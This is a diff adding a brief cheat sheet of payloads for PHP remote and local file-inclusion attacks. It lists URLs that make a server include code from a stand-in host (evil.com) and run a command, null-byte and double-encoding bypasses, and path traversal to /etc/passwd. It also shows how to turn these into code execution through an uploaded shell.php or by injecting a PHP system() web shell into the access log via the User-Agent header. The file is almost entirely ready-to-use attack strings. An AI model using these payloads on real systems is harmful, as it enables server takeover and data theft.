@@ -1,0 +1,24 @@
+RFI
+----
+* http://example.com/index.php?page=http://evil.com/home.php&cmd=pwd
+* Null byte=http://example.com/index.php?page=http://evil.com/home.php%00
+* Double encoding=http://example.com/index.php?page=http:%252f%252fevil.com%252fhome.php
+Force Extension:
+* change remote file name extension to ".php.html" and try as .php
+
+
+LFI
+----
+* http://example.com/index.php?page=pwd
+* http://example.com/index.php?page= ../../etc/passwd
+* nil byte : "%00" at the end
+
+
+RCE.Remote Code Execution
+--------------------------
+LFI + file upload to RCE
+* http://example.com/index.php?page= ../shell.php&cmd=pwd
+* Log poisoning- if the log file is readable and we can get shell
+    - intercept it: http://example.com/index.php?page=/var/log/access.log
+    - in Burp--User-Agent, add: <?php echo system($_GET['cmd']); exit; ?>
+    - http://example.com/index.php?page=/var/log/access.log&cmd=pwd
